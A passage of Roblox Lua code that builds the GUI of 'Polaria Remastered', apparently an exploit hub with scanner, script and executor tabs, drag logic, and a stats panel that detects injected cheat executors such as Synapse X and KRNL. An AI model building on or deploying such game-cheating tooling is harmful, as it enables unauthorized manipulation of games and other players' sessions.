DevHeadshot.Name = "DevHeadshot"
DevHeadshot.Image = GetAsset("PolariaRM/Assets/polaria_dev.png")
DevHeadshot.BorderSizePixel = 0
DevHeadshot.ScaleType = Enum.ScaleType.Fit
DevHeadshot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevHeadshot.Size = UDim2.new(0, 90, 0, 90)
DevHeadshot.BackgroundTransparency = 1
DevHeadshot.LayoutOrder = 1
DevHeadshot.Parent = CreditsContent

local DevHeadshotStroke = Instance.new("UIStroke")
DevHeadshotStroke.Name = "DevHeadshotStroke"
DevHeadshotStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
DevHeadshotStroke.Color = Color3.fromRGB(255, 255, 255)
DevHeadshotStroke.Parent = DevHeadshot

local DevHeadshotStrokeGradient = Instance.new("UIGradient")
DevHeadshotStrokeGradient.Name = "DevHeadshotStrokeGradient"
DevHeadshotStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
DevHeadshotStrokeGradient.Parent = DevHeadshotStroke

local DevHeadshotCorner = Instance.new("UICorner")
DevHeadshotCorner.Name = "DevHeadshotCorner"
DevHeadshotCorner.CornerRadius = UDim.new(1, 0)
DevHeadshotCorner.Parent = DevHeadshot

local DevHeadshotSC = Instance.new("UISizeConstraint")
DevHeadshotSC.Name = "DevHeadshotSC"
DevHeadshotSC.MinSize = Vector2.new(80, 80)
DevHeadshotSC.MaxSize = Vector2.new(100, 100)
DevHeadshotSC.Parent = DevHeadshot

local DevHeadshotRatio = Instance.new("UIAspectRatioConstraint")
DevHeadshotRatio.Name = "DevHeadshotRatio"
DevHeadshotRatio.Parent = DevHeadshot

local Desc = Instance.new("TextLabel")
Desc.Name = "Desc"
Desc.TextWrapped = true
Desc.BorderSizePixel = 0
Desc.TextSize = 20
Desc.TextXAlignment = Enum.TextXAlignment.Left
Desc.TextYAlignment = Enum.TextYAlignment.Top
Desc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Desc.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.BackgroundTransparency = 1
Desc.RichText = true
Desc.Size = UDim2.new(0, 410, 0, 184)
Desc.Text = "Fully made by JustAGuest."
Desc.LayoutOrder = 2
Desc.Position = UDim2.new(0, 94, 0, 54)
Desc.Parent = CreditsContent

local DescGradient = Instance.new("UIGradient")
DescGradient.Name = "DescGradient"
DescGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
DescGradient.Parent = Desc

local ScriptsContent = Instance.new("ScrollingFrame")
ScriptsContent.Name = "ScriptsContent"
ScriptsContent.Visible = false
ScriptsContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScriptsContent.ScrollingDirection = Enum.ScrollingDirection.Y
ScriptsContent.BorderSizePixel = 0
ScriptsContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptsContent.Size = UDim2.new(1, 0, 1, 0)
ScriptsContent.ScrollBarThickness = 0
ScriptsContent.LayoutOrder = 3
ScriptsContent.BackgroundTransparency = 1
ScriptsContent.Parent = Contents

local ScriptsContentGrid = Instance.new("UIGridLayout")
ScriptsContentGrid.Name = "ScriptsContentGrid"
ScriptsContentGrid.CellSize = UDim2.new(0, 102, 0, 34)
ScriptsContentGrid.CellPadding = UDim2.new(0, 4, 0, 4)
ScriptsContentGrid.Parent = ScriptsContent

local BtnExample = Instance.new("TextButton")
BtnExample.Name = "BtnExample"
BtnExample.TextWrapped = true
BtnExample.BorderSizePixel = 0
BtnExample.TextScaled = true
BtnExample.TextColor3 = Color3.fromRGB(255, 255, 255)
BtnExample.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BtnExample.Size = UDim2.new(0, 32, 0, 32)
BtnExample.Text = ""
BtnExample.Parent = ScriptsContent

local BtnExampleCorner = Instance.new("UICorner")
BtnExampleCorner.Name = "BtnExampleCorner"
BtnExampleCorner.CornerRadius = UDim.new(0, 4)
BtnExampleCorner.Parent = BtnExample

local BtnExampleGradient = Instance.new("UIGradient")
BtnExampleGradient.Name = "BtnExampleGradient"
BtnExampleGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
BtnExampleGradient.Parent = BtnExample

local BtnExampleContainer = Instance.new("Frame")
BtnExampleContainer.Name = "BtnExampleContainer"
BtnExampleContainer.Interactable = false
BtnExampleContainer.BorderSizePixel = 0
BtnExampleContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BtnExampleContainer.Size = UDim2.new(1, 0, 1, 0)
BtnExampleContainer.BackgroundTransparency = 1
BtnExampleContainer.Parent = BtnExample

local BtnExampleLabel = Instance.new("TextLabel")
BtnExampleLabel.Name = "BtnExampleLabel"
BtnExampleLabel.TextWrapped = true
BtnExampleLabel.BorderSizePixel = 0
BtnExampleLabel.TextScaled = true
BtnExampleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BtnExampleLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
BtnExampleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BtnExampleLabel.BackgroundTransparency = 1
BtnExampleLabel.Size = UDim2.new(1, 0, 1, 0)
BtnExampleLabel.Text = "Script name"
BtnExampleLabel.Parent = BtnExampleContainer

local BtnExampleLabelPadding = Instance.new("UIPadding")
BtnExampleLabelPadding.Name = "BtnExampleLabelPadding"
BtnExampleLabelPadding.PaddingTop = UDim.new(0, 6)
BtnExampleLabelPadding.PaddingRight = UDim.new(0, 6)
BtnExampleLabelPadding.PaddingLeft = UDim.new(0, 6)
BtnExampleLabelPadding.PaddingBottom = UDim.new(0, 6)
BtnExampleLabelPadding.Parent = BtnExampleLabel

local MainFrameStroke = Instance.new("UIStroke")
MainFrameStroke.Name = "MainFrameStroke"
MainFrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainFrameStroke.Color = Color3.fromRGB(255, 255, 255)
MainFrameStroke.Parent = MainFrame

local MainFrameStrokeGradient = Instance.new("UIGradient")
MainFrameStrokeGradient.Name = "MainFrameStrokeGradient"
MainFrameStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
MainFrameStrokeGradient.Parent = MainFrameStroke

local MainFrameGradient = Instance.new("UIGradient")
MainFrameGradient.Name = "MainFrameGradient"
MainFrameGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
MainFrameGradient.Parent = MainFrame

local Topbar = Instance.new("Frame")
Topbar.Name = "Topbar"
Topbar.BorderSizePixel = 0
Topbar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Topbar.Size = UDim2.new(1, 0, 0, 30)
Topbar.LayoutOrder = 1
Topbar.BackgroundTransparency = 1
Topbar.Parent = MainFrame

local TopbarSC = Instance.new("UISizeConstraint")
TopbarSC.Name = "TopbarSC"
TopbarSC.MinSize = Vector2.new(0, 30)
TopbarSC.MaxSize = Vector2.new(math.huge, 34)
TopbarSC.Parent = Topbar

local TopbarButtons = Instance.new("Frame")
TopbarButtons.Name = "TopbarButtons"
TopbarButtons.BorderSizePixel = 0
TopbarButtons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TopbarButtons.AutomaticSize = Enum.AutomaticSize.X
TopbarButtons.Size = UDim2.new(0, 0, 0, 10)
TopbarButtons.Position = UDim2.new(0, 108, 0, 0)
TopbarButtons.LayoutOrder = 2
TopbarButtons.BackgroundTransparency = 1
TopbarButtons.Parent = Topbar

local Close = Instance.new("TextButton")
Close.Name = "Close"
Close.TextWrapped = true
Close.BorderSizePixel = 0
Close.TextScaled = true
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Close.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Close.BackgroundTransparency = 1
Close.Size = UDim2.new(0, 32, 0, 32)
Close.LayoutOrder = 2
Close.Text = "X"
Close.Parent = TopbarButtons

local CloseCorner = Instance.new("UICorner")
CloseCorner.Name = "CloseCorner"
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = Close

local CloseGradient = Instance.new("UIGradient")
CloseGradient.Name = "CloseGradient"
CloseGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
CloseGradient.Parent = Close

local TopbarButtonsList = Instance.new("UIListLayout")
TopbarButtonsList.Name = "TopbarButtonsList"
TopbarButtonsList.HorizontalAlignment = Enum.HorizontalAlignment.Right
TopbarButtonsList.HorizontalFlex = Enum.UIFlexAlignment.Fill
TopbarButtonsList.VerticalFlex = Enum.UIFlexAlignment.Fill
TopbarButtonsList.Padding = UDim.new(0, 4)
TopbarButtonsList.VerticalAlignment = Enum.VerticalAlignment.Center
TopbarButtonsList.SortOrder = Enum.SortOrder.LayoutOrder
TopbarButtonsList.FillDirection = Enum.FillDirection.Horizontal
TopbarButtonsList.Parent = TopbarButtons

local Hide = Instance.new("TextButton")
Hide.Name = "Hide"
Hide.TextWrapped = true
Hide.BorderSizePixel = 0
Hide.TextScaled = true
Hide.TextColor3 = Color3.fromRGB(255, 255, 255)
Hide.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hide.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Hide.BackgroundTransparency = 1
Hide.Size = UDim2.new(0, 32, 0, 32)
Hide.LayoutOrder = 1
Hide.Text = "-"
Hide.Parent = TopbarButtons

local HideCorner = Instance.new("UICorner")
HideCorner.Name = "HideCorner"
HideCorner.CornerRadius = UDim.new(0, 4)
HideCorner.Parent = Hide

local HideGradient = Instance.new("UIGradient")
HideGradient.Name = "HideGradient"
HideGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
HideGradient.Parent = Hide

local TopbarButtonsSC = Instance.new("UISizeConstraint")
TopbarButtonsSC.Name = "TopbarButtonsSC"
TopbarButtonsSC.MinSize = Vector2.new(68, 0)
TopbarButtonsSC.MaxSize = Vector2.new(72, math.huge)
TopbarButtonsSC.Parent = TopbarButtons

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.TextWrapped = true
Title.BorderSizePixel = 0
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextScaled = true
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 586, 0, 30)
Title.Text = "Polaria Remastered"
Title.LayoutOrder = 1
Title.Parent = Topbar

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Name = "TitleGradient"
TitleGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
TitleGradient.Parent = Title

local TopbarList = Instance.new("UIListLayout")
TopbarList.Name = "TopbarList"
TopbarList.HorizontalFlex = Enum.UIFlexAlignment.Fill
TopbarList.VerticalFlex = Enum.UIFlexAlignment.Fill
TopbarList.Padding = UDim.new(0, 4)
TopbarList.SortOrder = Enum.SortOrder.LayoutOrder
TopbarList.FillDirection = Enum.FillDirection.Horizontal
TopbarList.Parent = Topbar

local Tabs = Instance.new("Frame")
Tabs.Name = "Tabs"
Tabs.BorderSizePixel = 0
Tabs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tabs.Size = UDim2.new(1, 0, 0, 34)
Tabs.LayoutOrder = 2
Tabs.BackgroundTransparency = 1
Tabs.Parent = MainFrame

local ScriptsTab = Instance.new("TextButton")
ScriptsTab.Name = "ScriptsTab"
ScriptsTab.TextWrapped = true
ScriptsTab.BorderSizePixel = 0
ScriptsTab.TextScaled = true
ScriptsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptsTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptsTab.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ScriptsTab.BackgroundTransparency = 1
ScriptsTab.Size = UDim2.new(0, 32, 0, 32)
ScriptsTab.LayoutOrder = 3
ScriptsTab.Text = "Scripts"
ScriptsTab.Parent = Tabs

local ScriptsTabStroke = Instance.new("UIStroke")
ScriptsTabStroke.Name = "ScriptsTabStroke"
ScriptsTabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ScriptsTabStroke.Color = Color3.fromRGB(255, 255, 255)
ScriptsTabStroke.Parent = ScriptsTab

local ScriptsTabStrokeGradient = Instance.new("UIGradient")
ScriptsTabStrokeGradient.Name = "ScriptsTabStrokeGradient"
ScriptsTabStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScriptsTabStrokeGradient.Parent = ScriptsTabStroke

local ScriptsTabGradient = Instance.new("UIGradient")
ScriptsTabGradient.Name = "ScriptsTabGradient"
ScriptsTabGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScriptsTabGradient.Parent = ScriptsTab

local ScriptsTabCorner = Instance.new("UICorner")
ScriptsTabCorner.Name = "ScriptsTabCorner"
ScriptsTabCorner.CornerRadius = UDim.new(0, 4)
ScriptsTabCorner.Parent = ScriptsTab

local ScriptsTabPadding = Instance.new("UIPadding")
ScriptsTabPadding.Name = "ScriptsTabPadding"
ScriptsTabPadding.PaddingTop = UDim.new(0, 2)
ScriptsTabPadding.PaddingRight = UDim.new(0, 4)
ScriptsTabPadding.PaddingLeft = UDim.new(0, 4)
ScriptsTabPadding.PaddingBottom = UDim.new(0, 2)
ScriptsTabPadding.Parent = ScriptsTab

local HomeTab = Instance.new("TextButton")
HomeTab.Name = "HomeTab"
HomeTab.TextWrapped = true
HomeTab.BorderSizePixel = 0
HomeTab.TextScaled = true
HomeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
HomeTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HomeTab.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
HomeTab.BackgroundTransparency = 1
HomeTab.Size = UDim2.new(0, 32, 0, 32)
HomeTab.LayoutOrder = 1
HomeTab.Text = "Home"
HomeTab.Parent = Tabs

local HomeTabCorner = Instance.new("UICorner")
HomeTabCorner.Name = "HomeTabCorner"
HomeTabCorner.CornerRadius = UDim.new(0, 4)
HomeTabCorner.Parent = HomeTab

local HomeTabGradient = Instance.new("UIGradient")
HomeTabGradient.Name = "HomeTabGradient"
HomeTabGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
HomeTabGradient.Parent = HomeTab

local HomeTabStroke = Instance.new("UIStroke")
HomeTabStroke.Name = "HomeTabStroke"
HomeTabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
HomeTabStroke.Color = Color3.fromRGB(255, 255, 255)
HomeTabStroke.Parent = HomeTab

local HomeTabStrokeGradient = Instance.new("UIGradient")
HomeTabStrokeGradient.Name = "HomeTabStrokeGradient"
HomeTabStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
HomeTabStrokeGradient.Parent = HomeTabStroke

local HomeTabPadding = Instance.new("UIPadding")
HomeTabPadding.Name = "HomeTabPadding"
HomeTabPadding.PaddingTop = UDim.new(0, 2)
HomeTabPadding.PaddingRight = UDim.new(0, 4)
HomeTabPadding.PaddingLeft = UDim.new(0, 4)
HomeTabPadding.PaddingBottom = UDim.new(0, 2)
HomeTabPadding.Parent = HomeTab

local TabsSC = Instance.new("UISizeConstraint")
TabsSC.Name = "TabsSC"
TabsSC.MinSize = Vector2.new(0, 32)
TabsSC.MaxSize = Vector2.new(math.huge, 36)
TabsSC.Parent = Tabs

local TabsList = Instance.new("UIListLayout")
TabsList.Name = "TabsList"
TabsList.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabsList.HorizontalFlex = Enum.UIFlexAlignment.Fill
TabsList.VerticalFlex = Enum.UIFlexAlignment.Fill
TabsList.Padding = UDim.new(0, 6)
TabsList.VerticalAlignment = Enum.VerticalAlignment.Center
TabsList.SortOrder = Enum.SortOrder.LayoutOrder
TabsList.FillDirection = Enum.FillDirection.Horizontal
TabsList.Parent = Tabs

local ScanTab = Instance.new("TextButton")
ScanTab.Name = "ScanTab"
ScanTab.TextWrapped = true
ScanTab.BorderSizePixel = 0
ScanTab.TextScaled = true
ScanTab.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanTab.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ScanTab.BackgroundTransparency = 1
ScanTab.Size = UDim2.new(0, 32, 0, 32)
ScanTab.LayoutOrder = 2
ScanTab.Text = "Scanner"
ScanTab.Parent = Tabs

local ScanTabGradient = Instance.new("UIGradient")
ScanTabGradient.Name = "ScanTabGradient"
ScanTabGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScanTabGradient.Parent = ScanTab

local ScanTabCorner = Instance.new("UICorner")
ScanTabCorner.Name = "ScanTabCorner"
ScanTabCorner.CornerRadius = UDim.new(0, 4)
ScanTabCorner.Parent = ScanTab

local ScanTabStroke = Instance.new("UIStroke")
ScanTabStroke.Name = "ScanTabStroke"
ScanTabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ScanTabStroke.Color = Color3.fromRGB(255, 255, 255)
ScanTabStroke.Parent = ScanTab

local ScanTabStrokeGradient = Instance.new("UIGradient")
ScanTabStrokeGradient.Name = "ScanTabStrokeGradient"
ScanTabStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScanTabStrokeGradient.Parent = ScanTabStroke

local ScanTabPadding = Instance.new("UIPadding")
ScanTabPadding.Name = "ScanTabPadding"
ScanTabPadding.PaddingTop = UDim.new(0, 2)
ScanTabPadding.PaddingRight = UDim.new(0, 4)
ScanTabPadding.PaddingLeft = UDim.new(0, 4)
ScanTabPadding.PaddingBottom = UDim.new(0, 2)
ScanTabPadding.Parent = ScanTab

local CreditsTab = Instance.new("TextButton")
CreditsTab.Name = "CreditsTab"
CreditsTab.TextWrapped = true
CreditsTab.BorderSizePixel = 0
CreditsTab.TextScaled = true
CreditsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CreditsTab.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
CreditsTab.BackgroundTransparency = 1
CreditsTab.Size = UDim2.new(0, 32, 0, 32)
CreditsTab.LayoutOrder = 5
CreditsTab.Text = "Credits"
CreditsTab.Parent = Tabs

local CreditsTabCorner = Instance.new("UICorner")
CreditsTabCorner.Name = "CreditsTabCorner"
CreditsTabCorner.CornerRadius = UDim.new(0, 4)
CreditsTabCorner.Parent = CreditsTab

local CreditsTabStroke = Instance.new("UIStroke")
CreditsTabStroke.Name = "CreditsTabStroke"
CreditsTabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CreditsTabStroke.Color = Color3.fromRGB(255, 255, 255)
CreditsTabStroke.Parent = CreditsTab

local CreditsTabStrokeGradient = Instance.new("UIGradient")
CreditsTabStrokeGradient.Name = "CreditsTabStrokeGradient"
CreditsTabStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
CreditsTabStrokeGradient.Parent = CreditsTabStroke

local CreditsTabGradient = Instance.new("UIGradient")
CreditsTabGradient.Name = "CreditsTabGradient"
CreditsTabGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
CreditsTabGradient.Parent = CreditsTab

local CreditsTabPadding = Instance.new("UIPadding")
CreditsTabPadding.Name = "CreditsTabPadding"
CreditsTabPadding.PaddingTop = UDim.new(0, 2)
CreditsTabPadding.PaddingRight = UDim.new(0, 4)
CreditsTabPadding.PaddingLeft = UDim.new(0, 4)
CreditsTabPadding.PaddingBottom = UDim.new(0, 2)
CreditsTabPadding.Parent = CreditsTab

local ExeTab = Instance.new("TextButton")
ExeTab.Name = "ExeTab"
ExeTab.TextWrapped = true
ExeTab.BorderSizePixel = 0
ExeTab.TextScaled = true
ExeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
ExeTab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExeTab.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ExeTab.BackgroundTransparency = 1
ExeTab.Size = UDim2.new(0, 32, 0, 32)
ExeTab.LayoutOrder = 4
ExeTab.Text = "Executor"
ExeTab.Parent = Tabs

local ExeTabCorner = Instance.new("UICorner")
ExeTabCorner.Name = "ExeTabCorner"
ExeTabCorner.CornerRadius = UDim.new(0, 4)
ExeTabCorner.Parent = ExeTab

local ExeTabStroke = Instance.new("UIStroke")
ExeTabStroke.Name = "ExeTabStroke"
ExeTabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ExeTabStroke.Color = Color3.fromRGB(255, 255, 255)
ExeTabStroke.Parent = ExeTab

local ExeTabStrokeGradient = Instance.new("UIGradient")
ExeTabStrokeGradient.Name = "ExeTabStrokeGradient"
ExeTabStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ExeTabStrokeGradient.Parent = ExeTabStroke

local ExeTabGradient = Instance.new("UIGradient")
ExeTabGradient.Name = "ExeTabGradient"
ExeTabGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ExeTabGradient.Parent = ExeTab

local ExeTabPadding = Instance.new("UIPadding")
ExeTabPadding.Name = "ExeTabPadding"
ExeTabPadding.PaddingTop = UDim.new(0, 2)
ExeTabPadding.PaddingRight = UDim.new(0, 4)
ExeTabPadding.PaddingLeft = UDim.new(0, 4)
ExeTabPadding.PaddingBottom = UDim.new(0, 2)
ExeTabPadding.Parent = ExeTab

local MainFrameList = Instance.new("UIListLayout")
MainFrameList.Name = "MainFrameList"
MainFrameList.HorizontalFlex = Enum.UIFlexAlignment.Fill
MainFrameList.VerticalFlex = Enum.UIFlexAlignment.Fill
MainFrameList.Padding = UDim.new(0, 6)
MainFrameList.SortOrder = Enum.SortOrder.LayoutOrder
MainFrameList.Parent = MainFrame

local MainFrameCorner = Instance.new("UICorner")
MainFrameCorner.Name = "MainFrameCorner"
MainFrameCorner.CornerRadius = UDim.new(0, 4)
MainFrameCorner.Parent = MainFrame

local function Dragify(DragObject, MoveObject)
    MoveObject = MoveObject or DragObject

    local dragging = false
    local dragInput
    local dragStart
    local startPos

    local function ClampPosition(newX, newY)
        local viewport = workspace.CurrentCamera.ViewportSize
        local size = MoveObject.AbsoluteSize
        local paddingX = 16
        local paddingY = 12

        local maxX = viewport.X - size.X - paddingX
        local maxY = viewport.Y - size.Y - paddingY
        local minX = paddingX
        local minY = paddingY

        newX = math.clamp(newX, minX, maxX)
        newY = math.clamp(newY, minY, maxY)

        return newX, newY
    end

    DragObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragInput = input
            dragStart = input.Position
            startPos = MoveObject.Position
        end
    end)

    DragObject.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            local newX = startPos.X.Offset + delta.X
            local newY = startPos.Y.Offset + delta.Y
            
            newX, newY = ClampPosition(newX, newY)
            
            MoveObject.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input == dragInput then
            dragging = false
            dragInput = nil
        end
    end)
end

Dragify(MainFrame, Container)
Dragify(Show)

currentContent = HomeContent

local function showContent(contentFrame)
    if currentContent then
        currentContent.Visible = false
    end
    contentFrame.Visible = true
    currentContent = contentFrame
end

HomeTab.MouseButton1Click:Connect(function()
    showContent(HomeContent)
end)

ScanTab.MouseButton1Click:Connect(function()
    showContent(ScannerContent)
end)

ScriptsTab.MouseButton1Click:Connect(function()
    showContent(ScriptsContent)
end)

ExeTab.MouseButton1Click:Connect(function()
    showContent(ExeContent)
end)

CreditsTab.MouseButton1Click:Connect(function()
    showContent(CreditsContent)
end)

Close.MouseButton1Click:Connect(function()
    PolariaRM:Destroy()
    Shared.PolariaRM.isLoaded = false
end)

Hide.MouseButton1Click:Connect(function()
    Container.Visible = false
    Show.Visible = true
end)

Show.MouseButton1Click:Connect(function()
    Container.Visible = true
    Show.Visible = false
end)

Container.Visible = false
Show.Visible = true

coroutine.wrap(function()
    local GetThumbnail = expect("function", Players.GetUserThumbnailAsync, nil)
    if GetThumbnail then
        local success, headshot = pcall(function()
            return GetThumbnail(Players, Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
        end)
        if success and headshot then
            Headshot.Image = headshot
        end
    end
end)()

RunService.RenderStepped:Connect(function(dt)
    lastDT = dt
end)

serverStartTime = workspace:GetServerTimeNow()

local function getOS()
    local GetPlatform = expect("function", UserInputService.GetPlatform, nil)
    if GetPlatform then
        local p = GetPlatform(UserInputService)
        if p == Enum.Platform.Windows then return "Windows" end
        if p == Enum.Platform.OSX then return "macOS" end
        if p == Enum.Platform.IOS then return "iOS" end
        if p == Enum.Platform.Android then return "Android" end
    end
    return "Unknown"
end

local function updateStats()
    local fps = lastDT > 0 and math.floor(1 / lastDT) or 0

    local ping = 0
    local net = Stats:FindFirstChild("Network")
    if net then
        local item = net:FindFirstChild("ServerStatsItem")
        if item and item:FindFirstChild("Data Ping") then
            local GetValue = expect("function", item["Data Ping"].GetValue, nil)
            if GetValue then
                ping = math.floor(GetValue(item["Data Ping"]))
            end
        end
    end

    local serverAge = math.floor(workspace:GetServerTimeNow() - serverStartTime)

    local device = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and "Mobile" or "PC"
    local osName = getOS()

    local executor = "Unknown"
    
    local executorChecks = {
        {cond = expect("boolean", syn and syn.request, false), name = "Synapse X"},
        {cond = expect("boolean", KRNL_isLoaded, false), name = "KRNL"},
        {cond = expect("boolean", fluxus, false), name = "Fluxus"},
        {cond = expect("boolean", is_sirhurt_closure, false), name = "SirHurt"},
        {cond = expect("boolean", PROTOSMASHER_isLoaded, false), name = "ProtoSmasher"},
        {cond = expect("boolean", ELECTRON_isLoaded, false), name = "Electron"},
        {cond = expect("boolean", is_synapse_function, false), name = "Synapse X"},
        {cond = expect("function", identifyexecutor, nil), name = identifyexecutor and identifyexecutor() or nil},
        {cond = expect("function", getexecutorname, nil), name = getexecutorname and getexecutorname() or nil}
    }
    
    for _, check in ipairs(executorChecks) do
        if check.cond and check.name then
            executor = check.name
            break
        end
    end

    HomeStats.Text =
        "Welcome, " .. Player.DisplayName .. " (@" .. Player.Name .. ")\n" ..
        "FPS: " .. fps ..
        "\nPing: " .. ping .. "ms" ..
        "\nServer age: " .. serverAge .. "s" ..
        "\nDevice: " .. device ..
        "\nOS: " .. osName ..
        "\nExecutor: " .. executor
end

task.spawn(function()
    while PolariaRM.Parent do
        updateStats()
        task.wait(0.5)
    end
end)

local alphabet = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
